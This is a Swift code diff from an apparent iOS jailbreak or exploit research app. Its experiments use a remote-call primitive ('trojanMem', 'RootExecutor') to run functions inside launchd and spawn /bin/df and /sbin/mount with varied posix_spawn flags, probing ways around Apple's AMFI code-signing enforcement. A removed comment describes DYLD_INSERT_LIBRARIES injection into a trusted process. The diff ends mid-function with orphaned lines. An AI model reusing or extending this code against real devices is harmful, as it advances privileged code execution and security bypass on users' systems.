@@ -300,21 +300,24 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp29)
             
             // ============================================
-            // Experiment 30: Spawn /bin/df with DYLD_INSERT_LIBRARIES
+            // Experiment 30: RELIABLE spawn test (isolated, extra wait)
+            // Reproduce the EXACT pattern that gave 1795 chars output
             // ============================================
-            let exp30 = self.expDYLDInsert(rc: rc)
+            let exp30 = self.expReliableSpawn(rc: rc)
             experimentResults.append(exp30)
             
             // ============================================
-            // Experiment 31: Use launchd's own xpc_spawn mechanism
+            // Experiment 31: Call launchd's job_submit internal API
+            // We ARE launchd — call our own job loading function!
             // ============================================
-            let exp31 = self.expLaunchdXPCSpawn(rc: rc)
+            let exp31 = self.expLaunchdJobSubmit(rc: rc)
             experimentResults.append(exp31)
             
             // ============================================
-            // Experiment 32: posix_spawn with envp (environment vars)
+            // Experiment 32: posix_spawn with POSIX_SPAWN_SETPGROUP
+            // Different spawn flags that might affect AMFI behavior
             // ============================================
-            let exp32 = self.expSpawnWithEnv(rc: rc)
+            let exp32 = self.expSpawnFlags(rc: rc)
             experimentResults.append(exp32)
             
             DispatchQueue.main.async {
@@ -1828,9 +1831,219 @@ struct AMFIExperimentView: View {
         return ExperimentResult(name: "ad-hoc (replaced)", success: false, detail: "See experiments 30-32", timestamp: Date())
     }
     
-    /// Spawn /bin/df with DYLD_INSERT_LIBRARIES pointing to a signed dylib
-    /// If DYLD loads our dylib → code injection into trusted process!
-    private func expDYLDInsert(rc: RemoteCall) -> ExperimentResult {
+    /// RELIABLE spawn — isolated test with extra debugging
+    /// Reproduces exact pattern that gave 1795 chars from /bin/df
+    private func expReliableSpawn(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        
+        // Use DIFFERENT memory offsets from other experiments to avoid collision
+        let outFile = "/tmp/.dsp_reliable_out"
+        let outAddr = remote_alloc_str(rc, outFile)
+        
+        // Step 1: Delete old file
+        RootExecutor.rcall(rc, "unlink", outAddr)
+        
+        // Step 2: Init file actions at DIFFERENT offset
+        let actionsAddr = mem + 0x1800 // far from other experiments
+        rc[actionsAddr].setValue64(0)
+        rc[actionsAddr + 8].setValue64(0)
+        rc[actionsAddr + 16].setValue64(0)
+        let initRet = RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
+        
+        // Step 3: addopen stdout
+        let addRet1 = RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
+                          actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        // addopen stderr
+        let addRet2 = RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
+                          actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
+        
+        // Step 4: Setup argv at different offset
+        let binAddr = remote_alloc_str(rc, "/bin/df")
+        let argvBase = mem + 0x1C00
+        rc[argvBase].setValue64(binAddr)
+        rc[argvBase + 8].setValue64(0) // NULL
+        
+        // Step 5: Spawn
+        let pidAddr = mem + 0x1A00
+        rc[pidAddr].setValue64(0xAAAA) // sentinel
+        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, 0)
+        let pidAfter = rc[pidAddr].value32()
+        
+        // Step 6: LONG wait (2 seconds)
+        RootExecutor.rcall(rc, "usleep", 2000000)
+        
+        // Step 7: waitpid(-1) to reap ANY child
+        let statusAddr = mem + 0x1B00
+        rc[statusAddr].setValue32(0)
+        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
+        let waitStatus = rc[statusAddr].value32()
+        
+        // Step 8: Check if output file exists and has content
+        let statAddr = mem + 0x1D00
+        let statRet = RootExecutor.rcall(rc, "stat", outAddr, statAddr)
+        
+        // Step 9: Read output
+        var output = ""
+        var fileSize: UInt64 = 0
+        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
+        if readFd != UInt64(bitPattern: -1) {
+            // Get file size via lseek
+            fileSize = RootExecutor.rcall(rc, "lseek", readFd, 0, 2) // SEEK_END
+            RootExecutor.rcall(rc, "lseek", readFd, 0, 0) // SEEK_SET
+            
+            let bufAddr = mem + 0x1E00
+            let toRead = min(fileSize, 2000)
+            if toRead > 0 {
+                let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, toRead)
+                if n > 0 && n <= toRead {
+                    var buf = [UInt8](repeating: 0, count: Int(n))
+                    rc.remoteRead(bufAddr, to: &buf, size: n)
+                    output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
+                }
+            }
+            RootExecutor.rcall(rc, "close", readFd)
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", outAddr)
+        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
+        RootExecutor.rcall(rc, "free", outAddr)
+        RootExecutor.rcall(rc, "free", binAddr)
+        
+        let detail = """
+        file_actions_init: \(initRet)
+        addopen(stdout): \(addRet1)
+        addopen(stderr): \(addRet2)
+        posix_spawn: ret=\(spawnRet), pid_sentinel=0x\(String(format: "%x", pidAfter))
+        usleep(2s): done
+        waitpid(-1): ret=\(waitRet), status=0x\(String(format: "%x", waitStatus))
+        stat(outfile): \(statRet == 0 ? "EXISTS" : "MISSING")
+        file size: \(fileSize)
+        output (\(output.count) chars):
+        \(output.prefix(500))
+        """
+        
+        return ExperimentResult(
+            name: "reliable spawn /bin/df",
+            success: !output.isEmpty,
+            detail: detail,
+            timestamp: Date()
+        )
+    }
+    
+    /// Call launchd's internal job submission
+    /// We ARE running inside launchd — we can call its own APIs!
+    private func expLaunchdJobSubmit(rc: RemoteCall) -> ExperimentResult {
+        // launchd uses xpc internally. Key functions:
+        // - xpc_dictionary_create
+        // - xpc_dictionary_set_string
+        // - job_new / job_dispatch
+        
+        // Simpler approach: use launch_data API (older but might work)
+        // launch_data_new_string, launch_data_dict_insert, launch_msg
+        
+        // Actually simplest: just try posix_spawn with NULL file_actions
+        // but with proper posix_spawnattr that sets process group
+        // This isolates the spawn from launchd's own process group
+        
+        let mem = rc.trojanMem
+        
+        // Try: spawn /sbin/mount (known to exist) with NO file actions
+        // Just check if it actually runs (creates a process)
+        let binAddr = remote_alloc_str(rc, "/sbin/mount")
+        let argvBase = mem + 0x1C00
+        rc[argvBase].setValue64(binAddr)
+        rc[argvBase + 8].setValue64(0)
+        
+        // Use posix_spawnattr with SETPGROUP
+        let attrAddr = mem + 0x1800
+        rc[attrAddr].setValue64(0)
+        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
+        // POSIX_SPAWN_SETPGROUP = 0x0002
+        // POSIX_SPAWN_SETSID = 0x0400 (new session)
+        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x0402) // SETPGROUP | SETSID
+        RootExecutor.rcall(rc, "posix_spawnattr_setpgroup", attrAddr, 0) // new pgroup
+        
+        let pidAddr = mem + 0x1A00
+        rc[pidAddr].setValue64(0xBBBB)
+        
+        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, attrAddr, argvBase, 0)
+        let pidVal = rc[pidAddr].value32()
+        
+        // Wait
+        RootExecutor.rcall(rc, "usleep", 1000000)
+        let statusAddr = mem + 0x1B00
+        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
+        
+        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
+        RootExecutor.rcall(rc, "free", binAddr)
+        
+        let detail = """
+        posix_spawn(/sbin/mount, attr=[SETPGROUP|SETSID], no file_actions):
+        ret=\(ret), pid=0x\(String(format: "%x", pidVal))
+        waitpid(-1): \(waitRet)
+        
+        If waitpid returns real PID → process actually spawned!
+        SETSID creates new session — might bypass some restrictions
+        """
+        
+        return ExperimentResult(name: "spawn + SETSID", success: waitRet > 0 && waitRet != UInt64(bitPattern: -1), detail: detail, timestamp: Date())
+    }
+    
+    /// Test various posix_spawn flags
+    private func expSpawnFlags(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        let binAddr = remote_alloc_str(rc, "/bin/df")
+        var results: [String] = []
+        
+        // Test different flag combinations
+        let flagSets: [(String, UInt64)] = [
+            ("no flags", 0),
+            ("SETPGROUP", 0x0002),
+            ("SETSID", 0x0400),
+            ("CLOEXEC_DEFAULT", 0x1000),
+            ("SETPGROUP|SETSID", 0x0402),
+            ("all safe flags", 0x1402),
+        ]
+        
+        for (name, flags) in flagSets {
+            let attrAddr = mem + 0x1800
+            rc[attrAddr].setValue64(0)
+            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
+            if flags != 0 {
+                RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
+            }
+            
+            let argvBase = mem + 0x1C00
+            rc[argvBase].setValue64(binAddr)
+            rc[argvBase + 8].setValue64(0)
+            
+            let pidAddr = mem + 0x1A00
+            rc[pidAddr].setValue64(0)
+            
+            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, flags == 0 ? 0 : attrAddr, 0, argvBase, 0)
+            
+            // Quick wait
+            RootExecutor.rcall(rc, "usleep", 300000) // 0.3s
+            let statusAddr = mem + 0x1B00
+            let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
+            
+            results.append("\(name): ret=\(ret), wait=\(waitRet)")
+            
+            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
+        }
+        
+        RootExecutor.rcall(rc, "free", binAddr)
+        
+        let anyWaited = results.contains(where: { $0.contains("wait=") && !$0.contains("wait=0") && !$0.contains("wait=18446") })
+        
+        return ExperimentResult(
+            name: "spawn flag variants",
+            success: anyWaited,
+            detail: results.joined(separator: "\n"),
+            timestamp: Date()
+        )
+    }
         let mem = rc.trojanMem
         let outFile = "/tmp/.dsp_dyld_test"
         let outAddr = remote_alloc_str(rc, outFile)
